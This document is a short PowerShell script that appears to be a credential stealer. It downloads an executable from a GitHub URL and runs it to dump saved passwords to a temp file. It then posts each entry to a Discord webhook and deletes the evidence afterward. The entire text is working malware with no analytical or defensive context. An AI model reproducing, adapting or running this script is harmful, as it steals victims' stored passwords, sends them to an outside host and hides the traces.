Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/p.exe" -OutFile "$env:TEMP\p.exe";
Start-Sleep -Seconds 2;
& $env:TEMP\p.exe /stext "$env:TEMP\data.txt";
Start-Sleep -Seconds 1;

$webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
$content = [IO.File]::ReadAllText("$env:TEMP\data.txt");

if (![string]::IsNullOrEmpty($content)) {
    $lines = $content -split '\r?\n\r?\n';
    if($lines.Length -ne 1) {
        $lines = $lines | Where-Object { $_ -ne "" };
    }
    foreach($psw in $lines) {
        $payload = @{
            content = "```````n$psw`n``````"
        }
        Invoke-RestMethod -URI ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE") -Method Post -Body $payload;
    }
}

Remove-Item -Path "$env:TEMP\p.exe";
Remove-Item -Path "$env:TEMP\data.txt";
